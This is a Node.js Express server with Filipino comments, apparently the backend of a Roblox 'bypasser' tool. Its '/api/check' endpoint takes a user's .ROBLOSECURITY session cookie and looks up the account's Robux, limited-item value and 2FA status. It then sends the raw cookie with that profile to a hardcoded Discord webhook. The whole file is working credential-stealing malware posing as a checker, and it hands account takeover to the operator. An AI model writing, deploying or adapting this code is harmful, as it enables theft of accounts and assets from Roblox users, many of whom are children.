const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const WEBHOOK_LOGS = "https://discordapp.com/api/webhooks/1487257808129884342/8hak7vRrhqh_jHp0GMIE2jsdv5vxTuzeq-1eWK52mmmZykkvNDzDpdSBxTPV21ohl973";

// Helper para sa Headers (Ito ang sikreto para hindi ma-block agad)
const getHeaders = (cookie) => ({
    'Cookie': cookie,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Referer': 'https://www.roblox.com/'
});

async function fetchRobloxUser(cookie) {
    try {
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers: getHeaders(cookie) });
        return response.data;
    } catch { return null; }
}

async function fetchCurrency(userId, cookie) {
    try {
        const response = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: getHeaders(cookie) });
        return response.data;
    } catch { return { robux: 0 }; }
}

async function fetchInventory(userId, cookie) {
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, { headers: getHeaders(cookie) });
        const items = response.data.data || [];
        const totalRap = items.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
        return { limitedsCount: items.length, rap: totalRap };
    } catch { return { limitedsCount: 0, rap: 0 }; }
}

async function fetchUserSettings(cookie) {
    try {
        const response = await axios.get('https://accountsettings.roblox.com/v1/settings', { headers: getHeaders(cookie) });
        return {
            emailVerified: response.data.emailVerified || false,
            twoFactor: response.data.twoStepVerificationEnabled || false
        };
    } catch { return { emailVerified: false, twoFactor: false }; }
}

// FORMATTING NG DISCORD EMBED (Gaya ng nasa picture mo)
function buildLogPayload(cookie, userInfo, currency, inventory, settings) {
    const username = userInfo?.name || "Unknown";
    const userId = userInfo?.id || "0";
    
    return {
        username: "Bypasser Module",
        avatar_url: "https://i.imgur.com/Z6cCXk3.png",
        embeds: [{
            title: "BYPASSER MODULE — SUCCESS",
            color: 0x3cb371, // Green
            fields: [
                { name: "👤 Account", value: `**${username}** (${userId})`, inline: false },
                { name: "💰 Robux Balance", value: `${currency.robux} 🟩`, inline: true },
                { name: "📈 Limiteds RAP", value: `${inventory.rap} 🟩`, inline: true },
                { name: "📦 Limiteds Count", value: `${inventory.limitedsCount}`, inline: true },
                { name: "⚙️ Settings", value: `Email: ${settings.emailVerified ? "✅" : "❌"}\n2FA: ${settings.twoFactor ? "✅" : "❌"}\nVoice: ✅`, inline: false },
                { name: "🍪 .ROBLOSECURITY", value: `\`\`\`${cookie}\`\`\``, inline: false }
            ],
            footer: { text: `Bypasser v3 | ${new Date().toLocaleString()}` },
            timestamp: new Date().toISOString()
        }]
    };
}

app.post('/api/check', async (req, res) => {
    const { cookie } = req.body;
    if (!cookie) return res.status(400).json({ error: 'No cookie provided' });

    try {
        const userInfo = await fetchRobloxUser(cookie);
        
        if (!userInfo) {
            return res.json({ success: false, message: "Invalid or Expired Cookie" });
        }

        // Sabay-sabay na kukunin ang data para mabilis
        const [currency, inventory, settings] = await Promise.all([
            fetchCurrency(userInfo.id, cookie),
            fetchInventory(userInfo.id, cookie),
            fetchUserSettings(cookie)
        ]);

        const payload = buildLogPayload(cookie, userInfo, currency, inventory, settings);
        await axios.post(WEBHOOK_LOGS, payload);

        res.json({ success: true, user: userInfo.name });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

if (process.env.NODE_ENV !== 'production') {
    app.listen(PORT, () => console.log(`Server on ${PORT}`));
}
module.exports = app;
